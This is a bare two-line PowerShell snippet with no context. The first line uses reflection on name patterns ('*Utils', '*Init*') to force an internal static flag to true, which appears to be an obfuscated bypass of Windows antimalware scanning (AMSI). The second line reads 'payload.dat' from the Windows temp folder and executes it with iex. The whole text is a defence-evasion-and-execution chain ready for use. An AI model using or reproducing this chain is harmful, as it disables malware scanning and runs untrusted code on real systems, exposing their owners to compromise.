[Ref].Assembly.GetTypes()|?{$_.Name-like"*Utils"}|%{$_.GetFields("NonPublic,Static")|?{$_.Name-like"*Init*"}|%{$_.SetValue($null,$true)}}
iex([IO.File]::ReadAllText("C:\Windows\Temp\payload.dat"))
